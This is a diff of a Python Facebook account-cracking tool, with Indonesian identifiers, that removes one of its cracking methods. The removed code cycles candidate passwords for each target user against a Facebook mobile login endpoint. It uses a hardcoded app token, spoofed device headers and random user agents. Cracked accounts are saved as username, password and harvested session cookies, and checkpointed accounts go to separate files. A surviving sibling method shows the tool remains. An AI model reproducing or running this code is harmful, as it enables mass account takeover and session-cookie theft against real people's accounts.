@@ -443,57 +443,6 @@ class crack:
 					exit("\n ! isi yang benar")
 					
 		self.hasil(ok,cp)
-					
-	#--- methode #Dalvik/2.1.0 (Linux; U; Android 6.0.1; SM-J700F Build/MMB29K) [FBAN/Orca-Android;FBAV/181.0.0.12.78;FBPN/com.facebook.orca;FBLC/tr_TR;FBBV/122216364;FBCR/Turk Telekom;FBMF/samsung;FBBD/samsung;FBDV/SM-J700F;FBSV/6.0.1;FBCA/armeabi-v7a:armeabi;FBDM{density=3.0,width=900,height=1600}
-	def __crack__(self, user, peweh, url_log):
-		global ok,cp,loop 
-		komtol=random.choice([f"{M}",f"{K}",f"{H}",f"{N}",f"{U}",f"{P}"])
-		print (f"\r{komtol} • {P}{str(loop)}/{len(self.id)} - {H}OK:-{len(ok)} {K}CP:-{len(cp)}   ",end="")
-		for pw in peweh:
-			try: 
-				ses = requests.Session()
-				ua = random.choice(uasm)
-				params = {
-					"access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
-					"sdk_version": {random.randint(22,31)}, 
-					"email": user,
-					"format": "json",
-					"locale": "en_US",
-					"password": pw,
-					"sdk": "Android",
-					"generate_session_cookies": "1",
-					"credentials_type": "device_based_login_password",
-					"sig": "62f8ce9f74b12f84c123cc23437a4a32"
-				}
-				headers = {
-					"Host": url_log,
-					"x-fb-connection-bandwidth": str(random.randint(20000000.0, 30000000.0)),
-					"x-fb-sim-hni": str(random.randint(20000, 40000)),
-					"x-fb-net-hni": str(random.randint(20000, 40000)),
-					"x-fb-connection-quality": "EXCELLENT",
-					"x-fb-connection-type": "cell.CTRadioAccessTechnologyHSDPA",
-					"user-agent": ua,
-					"content-type": "application/x-www-form-urlencoded",
-					"x-fb-http-engine": "Liger"
-				}
-				post = ses.post(f"https://{url_log}/v6.0/auth/login",params=params, headers=headers, allow_redirects=False)
-				if "session_key" in post.text and "EAA" in post.text:
-					kukis = ";".join(i["name"]+"="+i["value"] for i in post.json()["session_cookies"])
-					print(f'\r{P}└──{H} {user} ◊ {pw} \n{P} └─ {H}{kukis} \n ')
-					ok.append(f"{user} ◊ {pw} ◊ {kukis} ")
-					open(f'OK/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw} ◊ {kukis} \n")
-					break
-				elif "User must verify their account" in post.text:
-					print (f'\r{P}└── {K}{user} ◊ {pw}  \n ')
-					cp.append(f'{user} ◊ {pw}')
-					open(f'CP/{waktu}.txt', 'a').write(f" *--> {user} ◊ {pw}\n")
-					break
-				else:
-					continue
-			except requests.exceptions.ConnectionError:
-				jeda(3)
-			
-		loop+=1
 
 #--- methode
 	def __Nugraha__(self, user, peweh, url_log):
